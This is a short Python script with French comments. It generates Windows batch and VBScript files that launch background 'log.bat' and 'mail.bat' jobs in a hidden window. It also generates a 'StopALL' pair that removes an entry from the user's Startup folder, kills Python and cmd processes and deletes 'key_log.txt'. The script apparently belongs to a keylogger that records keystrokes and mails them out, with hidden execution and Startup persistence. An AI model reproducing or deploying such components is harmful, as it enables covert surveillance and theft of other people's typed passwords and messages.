import getpass # donne des infos sur l'utilisateur
import os

USER_NAME = getpass.getuser()

file_path = os.path.dirname(os.path.realpath(__file__))

	

#Ici on cree et on donne le script du fichier FirstBoot.bat
with open(file_path + '\\system' +'\\'+ "FirstBoot.bat", "w+") as bat_file:
	bat_file.write("cd %s\system \n" % file_path)
	bat_file.write("start /B log.bat \n")
	bat_file.write("start /B mail.bat")
	
#Ici on cree et on donne le script du fichier FirstBoot.vbs
with open(file_path + '\\' + "FirstBoot.vbs", "w+") as vbs_file:
	vbs_file.write("Set wshShell = CreateObject(\"wScript.Shell\")\n")
	vbs_file.write("wshShell.Run chr(34) & \"%s\system\FirstBoot.bat\" & chr(34), 0\n" % file_path)
	vbs_file.write("Set wshShell = Nothing")

#Ici on cree et on donne le script du fichier StopALL.bat
bat_path= "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" % USER_NAME
with open(file_path + '\\system' +'\\'+ "StopALL.bat", "w+") as bat_file:
	bat_file.write("cd %s\n" % bat_path)
	bat_file.write("del open.vbs\n")
	bat_file.write("taskkill /f /im python.exe\n")
	bat_file.write("cd %s\system\n" % file_path)
	bat_file.write("del key_log.txt\n")
	bat_file.write("taskkill /f /im cmd.exe")

#Ici on cree et on donne le script du fichier StopALL.vbs
with open(file_path + '\\' + "StopALL.vbs", "w+") as vbs_file:
	vbs_file.write("Set wshShell = CreateObject(\"wScript.Shell\")\n")
	vbs_file.write("wshShell.Run chr(34) & \"%s\system\StopALL.bat\" & chr(34), 0\n" % file_path)
	vbs_file.write("Set wshShell = Nothing")
